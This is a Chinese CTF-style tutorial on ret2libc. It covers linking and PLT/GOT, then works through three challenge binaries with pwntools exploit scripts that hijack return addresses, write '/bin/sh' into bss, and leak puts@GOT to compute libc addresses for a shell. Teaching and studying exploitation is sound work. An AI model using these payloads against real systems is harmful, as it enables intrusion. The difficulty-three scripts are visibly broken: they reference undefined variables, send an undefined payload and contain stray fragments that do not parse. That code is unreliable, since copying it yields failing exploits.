# 06.ret2libc

<a name="2485c08b"></a>
## 概述：

 前文介绍了ROP的基本原理，但前面的方法有一些局限性，一旦目标程序调用的函数较少，或者使用动态编译，就会导致我们可以利用的gadget变少，从而无法达到利用效果。为了解决这种问题，我们可以选择使用ROP的方式，到动态链接库里面寻找gadget。即ret2libc。

<a name="857f3dbd"></a>
## 静态链接和动态链接：

链接：程序经过预处理，编译，汇编，链接之后可以生成可执行文件，链接可以将多个汇编之后的程序拼在一起。也可以链接函数库，库是一种软件组件技术，库里面封装了数据和函数，比如常用的printf，get函数。链接包含函数库，可以方便代码的复用，避免重复造轮子。

<a name="3fb301d9"></a>
### 静态链接：

前面的所讲的ret2syscall所利用的二进制程序就是经过静态链接得到的。静态链接就是将整个库直接链接到程序中，一般这样的程序占用空间会比较大，并且会有很多不会用到的函数。

<a name="f50c3c2f"></a>
### 动态链接：

随着系统中可执行文件的增加，静态链接所带来的磁盘和内存空间浪费问题愈发严重。例如大部分可执行文件都需要glibc，那么在静态链接的时候就需要把libc.a和编写的代码链接进去，单个libc.a的大小为5M左右，那么1000个就是5G。如果两个静态链接的可执行文件都包含testLib.o，那么在装载入内存时，两个相同的库也会被装载进去，造成内存空间的浪费。静态链接另一个明显的缺点就是，如果对标准函数哪怕做了一点很微小的改动，都需要重新编译整个源文件，使得开发和维护很艰难。<br />如果不把系统库和自己编写的代码链接到一个可执行文件，而是分割成两个独立的模块，等到程序真正运行时，再把这两个模块进行链接，就可以节省硬盘空间，并且内存中的一个系统库可以被多个程序共同使用，还节省了物理内存空间。这种在运行或加载时，在内存中完成链接的过程叫做动态链接，这些用于动态链接的系统库称为共享库，或者共享对象，整个过程由动态链接器完成。<br />Linux下动态库文件的文件名形如 libxxx.so，其中so是 Shared Object 的缩写，即可以共享的目标文件。

<a name="ce7a8d6c"></a>
### PLT&GOT表以及延迟绑定机制：

yichen大佬的文章，写的非常详细：[地址](https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL)<br />[视频讲解](https://www.bilibili.com/video/av86637221)

参考资料：《程序员的自我修养-链接、装载与库》

<a name="8ce09a14"></a>
## 利用方式：

下面我们将使用三个例题从易到难来讲解ret2libc的利用方式：

<a name="ac05bb53"></a>
### 难度一：

<a name="79908a99"></a>
#### 例题初探：

程序中存在system函数和/bin/sh字符串，但与ret2text不同的是，此时的system函数的参数并不是/bin/sh，而是一个奇怪字符：<br />![](https://img-blog.csdnimg.cn/a33cde43360f4cc489fd4ae4f258e250.png#crop=0&crop=0&crop=1&crop=1&id=rrCIa&originHeight=163&originWidth=351&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

并且/bin/sh所在的位置为：<br />![](https://img-blog.csdnimg.cn/f00f267e96254b90add8ca4df3422033.png#crop=0&crop=0&crop=1&crop=1&id=z28bX&originHeight=117&originWidth=903&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />如果我们单纯的将返回地址覆盖为system的地址，程序就会执行system（“shell！？”），但是shell！？并不是一个系统命令，此时程序执行会产生错误，就相当于我们直接在命令行敲shell！？，系统会提示找不到命令，但如果敲/bin/sh就会返回一个真正的shell。如果我们要想利用system函数并且让程序返回一个shell，那么我们就必须要让system函数的参数变为/bin/sh。

<a name="801344bd"></a>
#### 那么如何让system的参数变成/bin/sh？

首先回顾一下汇编调用过程：汇编调用函数过程中会首先将参数压栈，然后返回地址压栈，然后是ebp的地址。<br />![](https://img-blog.csdnimg.cn/da5ca471954c4957b575e41321e3fc64.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_17,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=ZHzxh&originHeight=478&originWidth=639&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />当程序调用system函数时，会自动去寻找栈底即ebp指向的位置，然后将ebp+8字节的位置的数据当作函数的参数，所以如果我们想将/bin/sh作为system函数的参数，就可以在栈溢出的时候，先修改eip为system函数的地址，然后填充4个字节的垃圾数据，再将/bin/sh的地址写入栈上，这样调用system函数的时候，就可以将/bin/sh作为参数，然后返回一个shell。<br />![](https://img-blog.csdnimg.cn/6b04fcf16d014f3e93080449eb2b5bb7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=txlC5&originHeight=442&originWidth=1039&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />**注意：** 为什么是在eip（即system函数地址）后面覆盖4个字节垃圾数据而不是前面提到的8个字节，这是因为当我们调用system函数的时候，在system函数中会首先执行push ebp指令，将4字节的ebp地址压入栈中，而此时的栈底距离我们的参数/bin/sh正好8字节，所以我们应该填充4字节垃圾数据。

<a name="15c13488"></a>
#### 完整利用过程：

<a name="562b019f"></a>
##### 首先checksec：

![](https://img-blog.csdnimg.cn/15183c836e0f4bfc8024d1df8025e011.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_18,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=SDRbp&originHeight=282&originWidth=668&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

32位程序，无canary，无pie。

<a name="8eeaae56"></a>
##### 32位ida pro打开：

![](https://img-blog.csdnimg.cn/835e484ec4ad4a088193c52ed655b535.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_17,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=ECfNk&originHeight=257&originWidth=654&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />明显的栈溢出漏洞。<br />![](https://img-blog.csdnimg.cn/7e9da3841c3c47f7b38e2f7e026c7218.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_13,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=w8XWL&originHeight=318&originWidth=505&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />存在system函数，地址为：<br />![](https://img-blog.csdnimg.cn/2df520385bd14a68babe316ac5d595bd.png#crop=0&crop=0&crop=1&crop=1&id=vd4tF&originHeight=124&originWidth=886&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />/bin/sh地址为：<br />![](https://img-blog.csdnimg.cn/4b990dca65204fbfa90adeade3d62299.png#crop=0&crop=0&crop=1&crop=1&id=Lvxgt&originHeight=130&originWidth=967&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

然后动态调试确定栈溢出大小：<br />![](https://img-blog.csdnimg.cn/f979ce7160004130a2b10eb8b2aae4c6.png#crop=0&crop=0&crop=1&crop=1&id=tAQdc&originHeight=183&originWidth=401&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />脚本如下：

```python
from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat(['a' * 112, system_plt,'b'*4,binsh_addr])
sh.sendline(payload)

sh.interactive()
```

<a name="754552fc"></a>
### 难度二：

<a name="79908a99-1"></a>
#### 例题初探：

![](https://img-blog.csdnimg.cn/ba21a87c25544e168b8a5d306c21f557.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_19,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=N8QIn&originHeight=314&originWidth=714&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以看到存在明显的栈溢出漏洞。在secure函数里发现存在system函数：<br />![](https://img-blog.csdnimg.cn/daee7273d2dd432490907fcbceabad81.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_11,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=r7LAV&originHeight=297&originWidth=444&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />按shift+f12查看字符串发现并没有“/bin/sh”，所以我们需要自己写入一个/bin/sh作为system函数的参数，才能让程序执行system('/bin/sh')，从而控制掉程序。<br />![](https://img-blog.csdnimg.cn/00a85c22828947f7b4a42e64914f4033.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=YtxaJ&originHeight=226&originWidth=838&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

<a name="77ae907c"></a>
#### 如何写入/bin/sh字符串并找到字符串的位置?

目前程序中有一个gets函数可以让我们利用，我们可以首先通过栈溢出，将程序的返回地址覆盖为gets函数的地址，然后再将bss段的地址作为函数的参数，这样就可以将‘/bin/sh’写入到bss段。（为什么选择bss段，而不是直接将/bin/sh写入到栈上，因为栈在执行的过程中他的地址是不确定的，如果将/bin/sh写入到栈上，当我们调用system函数的时候需要将/bin/sh的地址作为函数的参数，但此时我们无法确定栈的地址；但如果我们将/bin/sh写到bss段，当程序没有开启PIE保护时，bss的地址是不变的，并且bss段是可写的。）<br />然后，我们再把通过栈溢出调用的gets函数的返回地址覆盖为system函数的地址，并且函数的参数为我们刚才的写入到bss段的‘/bin/sh’字符串的地址。<br />综上所述，我们的payload应该在执行完之后将栈覆盖成如下形式：<br />![](https://img-blog.csdnimg.cn/8fdd1c6d4e6848dfa33aa9adab97735d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_9,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=WcFIX&originHeight=384&originWidth=372&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />其中，第一个buf2是gets函数的参数，此时我们要往这个地址里面写入/bin/sh，第二个buf2是system函数的参数，此时我们要读取此处的/bin/sh字符串。

<a name="d3bbef50"></a>
#### 完整过程：

<a name="562b019f-1"></a>
##### 首先checksec：

![](https://img-blog.csdnimg.cn/f9756ffec5724c60b440ec61e59331e3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_14,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=O1PRz&originHeight=230&originWidth=551&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />32位程序，没有canary，没有pie，很轻松可以完成栈溢出。

<a name="0114d683"></a>
##### 然后ida打开：

![](https://img-blog.csdnimg.cn/8c3c9840c8cd421297586e3424639988.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_19,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=ySgVm&originHeight=283&originWidth=720&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />gets函数，明显的栈溢出。<br />![](https://img-blog.csdnimg.cn/05ab0d75ea6a4a7c9bfe747652a9f874.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_14,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=QpX5j&originHeight=320&originWidth=525&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />secure函数里调用了system函数，但没有/bin/sh字符串，需要我们自己写，前面已经讨论过方法。<br />寻找system函数的plt地址为：0x08048490<br />![](https://img-blog.csdnimg.cn/23771a3eeb7743388a987a454a1c56ca.png#crop=0&crop=0&crop=1&crop=1&id=FPVfd&originHeight=114&originWidth=673&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />gets函数的plt地址为：0x08048460<br />![](https://img-blog.csdnimg.cn/789d4dd2ceb34e3ca9b32c11aac48382.png#crop=0&crop=0&crop=1&crop=1&id=hGt2v&originHeight=147&originWidth=867&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />我们需要写入的bss段的地址为：0x804a080<br />![](https://img-blog.csdnimg.cn/8faadc8e7c3545bb8142f788c06fd2b9.png#crop=0&crop=0&crop=1&crop=1&id=i8WS4&originHeight=168&originWidth=632&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

<a name="20258611"></a>
##### 动态调试：

确定的栈溢出所需的字节为112：<br />![](https://img-blog.csdnimg.cn/9c718edb5cfe471b88faff573e3286c8.png#crop=0&crop=0&crop=1&crop=1&id=p0Gkj&originHeight=92&originWidth=413&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

<a name="ad6477e1"></a>
##### 构造payload并写出脚本：

```python
#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
buf2 = 0x804a080
payload = flat(
    ['a' * 112, gets_plt, system_plt, buf2, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
```

<a name="3485065a"></a>
### 难度三：

<a name="79908a99-2"></a>
#### 例题初探：

![](https://img-blog.csdnimg.cn/5eae248302df4656a88888bc6a69b2ba.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=XqdcF&originHeight=293&originWidth=746&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />存在栈溢出。<br />![](https://img-blog.csdnimg.cn/db75faf7c6a44d2cbc9a73d148007cd5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_13,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=YwJlr&originHeight=309&originWidth=490&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />没有system函数。<br />![](https://img-blog.csdnimg.cn/9b4d003355f44b689461b40e70b5b1fd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=d7Unh&originHeight=227&originWidth=966&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />没有/bin/sh字符串。<br />/bin/sh字符串我们可以用前面的方法写入，但system函数是无法写入的。所以我们换了一种方法，在linux延迟绑定机制中，当程序调用库函数时，会将libc.so文件中的函数地址写到程序的got表中，调用时会跳转到got表所写的地址。那么我们如果要调用system函数，就要知道他的got表中的地址，got表中的地址指的就是当系统将libc（动态链接库）加载到内存中时，库中的函数的地址。但libc被加载到的内存的位置是随机的，我们无从得知。<br />但是，同一版本的libc的两个库函数在libc中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的got表地址，然后确定libc的版本，就可以加上和system函数的偏移，从而得到system函数的真实地址，即got表地址。<br />碰巧的是，我们拥有一个puts函数，我们可以用puts函数，将一个已经执行过的函数的got表地址打印出来，然后再根据地址获取libc版本，确定偏移，得到真实地址；并且，在libc中，存在着system函数和/bin/sh字符串，所以我们只需要考虑如何得到一个执行过的函数的真实地址即可，并不需要考虑如何写入/bin/sh字符串。<br />![](https://img-blog.csdnimg.cn/e6cb441a8092478b902193f1701ebc2a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=kny5x&originHeight=582&originWidth=898&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

<a name="de00989c"></a>
#### 如何获取真实地址：

经过前面的讨论，我们需要通过栈溢出利用puts函数，打印puts函数的got表中的地址，然后获取偏移，得到system函数和/bin/sh字符串的地址，将puts函数的地址覆盖为system函数的地址。除了获取gots表中的地址之外，其他步骤都与前面的例题二类似。<br />根据函数的真实地址查找偏移的可以去下面的网站：<br />[https://libc.nullbyte.cat/](https://libc.nullbyte.cat/)<br />[https://libc.blukat.me/](https://libc.blukat.me/)<br />因为我们需要中途暂停程序去获取偏移，所以我们可以构造两个payload，第一个payload用于溢出利用puts函数打印出真实地址，然后程序等待我们的输入，第二个payload用于获取我们输入的system函数和/bin/sh的地址，然后进行利用，得到shell。<br />payload如下：<br />![](https://img-blog.csdnimg.cn/77d13db697754fa1a8f62e3847fff683.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=XBtht&originHeight=487&originWidth=787&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

<a name="d3bbef50-1"></a>
#### 完整过程：

<a name="562b019f-2"></a>
##### 首先checksec：

![](https://img-blog.csdnimg.cn/2da28a9f279244a387aa4937afacc97b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_18,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=zvW3b&originHeight=240&originWidth=676&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />32位程序，没有canary，PIE保护。

<a name="50f297a2"></a>
##### ida打开：

![](https://img-blog.csdnimg.cn/fe4f5738bcd04e6fbe3cd80ed056f189.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=SVxmI&originHeight=323&originWidth=738&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />![](https://img-blog.csdnimg.cn/ca2ee1177018424caa4a0bc4bba08b45.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_13,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Qg2RC&originHeight=336&originWidth=500&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />![](https://img-blog.csdnimg.cn/638286dd0ede4ed99366f77ccaa3451f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=bHyba&originHeight=200&originWidth=766&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />没有system函数，没有/bin/sh字符串。

<a name="20258611-1"></a>
##### 动态调试：

![](https://img-blog.csdnimg.cn/dc718bd970d446828c4ebac905b73bb4.png#crop=0&crop=0&crop=1&crop=1&id=R7PsX&originHeight=92&originWidth=418&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />栈大小为112。

<a name="ad6477e1-1"></a>
##### 构造payload并写出脚本：

脚本1,用于泄露puts函数的真实地址，即got表地址。

```python
#!/usr/bin/env python
from pwn import *

elf=ELF('ret2libc3')
p=process('./ret2libc3')
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
start_addr = elf.symbols['_start']
#获取_start函数的地址是为了方便一会返回到此处，进行第二次栈溢出。
payload1='A'*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)
p.sendlineafter("!?",payload1)
puts_addr=u32(p.recv(4))
print("puts_got_addr = ",hex(puts_got_addr))
print("puts_plt_addr = ",hex(puts_plt_addr))
print("main_plt_addr = ",hex(main_plt_addr))
print("puts addr = ", hex(puts_addr))
#打印出puts函数的真实地址。
p.interactive()
```

运行上面的代码之后就可以得到puts函数的真实地址，然后去libcsearch的网站查询之后，可得到puts函数，system函数，/bin/sh字符串对应的偏移地址。<br />![](https://img-blog.csdnimg.cn/66db2c69d62a4149868ab50a5c933698.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=KFCdZ&originHeight=701&originWidth=1536&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />知道了puts函数的真实地址和偏移之后，就可以将puts函数的真实地址减去偏移地址，得到libc的基址，将libc的基址分别与system，/bin/sh字符串的偏移相加，就可以得到对应的真实地址，然后就可以构造payload2了。

```python
from pwn import *

p = process('./ret2libc3')
elf = ELF('./ret2libc3')

puts_got_addr = elf.got['puts']
puts_plt_addr = elf.plt['puts']
main_plt_addr = elf.symbols['_start']

print("puts_got_addr = ",hex(puts_got_addr))
print("puts_plt_addr = ",hex(puts_plt_addr))
print("main_plt_addr = ",hex(main_plt_addr))


p.recv()
p.sendline(payload)

puts_addr = u32(p.recv()[0:4])
print("puts_addr = ",hex(puts_addr))
sys_offset = 0x03cd10
puts_offset = 0x067360
sh_offset = 0x17b8cf

#根据公式  libc基地址  +  函数偏移量   =  函数真实地址   来计算
libc_base_addr = puts_addr - puts_offset #计算出libc基地址
sys_addr = libc_base_addr + sys_offset #计算出system的真实地址
sh_addr = libc_base_addr + sh_offset #计算出/bin/sh的真实地址

print("libc_base_addr = ",hex(libc_base_addr))
print("sys_addr = ",hex(sys_addr))
print("sh_addr = ",hex(sh_addr))

payload2 = flat(['A'*112, p32(sys_addr), "AAAA", p32(sh_addr)]) #system函数参数

p32(sys_addr) #覆盖返回地址为system函数
 "AAAA"  #system的返回地址，随便输，因为之前调用了system('/bin/sh')
p32(sh_addr)]) #system函数参数

p.sendline(payload2)
p.interactive()
```
